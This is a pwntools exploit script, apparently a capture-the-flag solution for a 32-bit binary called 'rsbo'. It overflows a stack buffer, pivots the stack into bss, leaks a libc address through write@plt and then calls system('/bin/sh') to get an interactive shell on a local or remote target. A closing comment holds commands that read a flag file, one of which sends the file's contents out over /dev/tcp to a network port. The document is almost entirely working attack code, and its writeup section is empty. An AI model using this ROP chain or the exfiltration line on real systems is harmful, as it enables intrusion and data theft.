from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
if len(sys.argv) == 1:
    r = process("./rsbo_patched")
    if args.GDB:
        gdb.attach(r,'b *0x08048734\nhandle SIGALRM ignore\nb *0x0804872e')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

pop_ebx_ret = 0x080483cd
main_read = 0x0804865c
main = 0x804867f
# Padding has to be 0
bss = 0x804a000 + 0x400
bss2 = bss + 0x200
leave_ret = 0x08048733
ret = 0x08048734
ppp = 0x0804879d
s(b"\x00" * 104 + p32(bss - 4) + p32(main_read) + p32(pop_ebx_ret) + p32(bss) + p32(leave_ret))
write_plt = 0x8048450
s(p32(bss2) + p32(write_plt) + p32(ppp) + p32(1) + p32(0x0804a020) + p32(4) + p32(main))
libc = l32() - 0x2f2d0
leak("libc",hex(libc))
system = libc + 0x3ad80
bin_sh = libc + 0x15ba3f
s(b'\x00' * 104 + p32(system) + p32(0xDEADBEEF) + p32(bin_sh))
r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''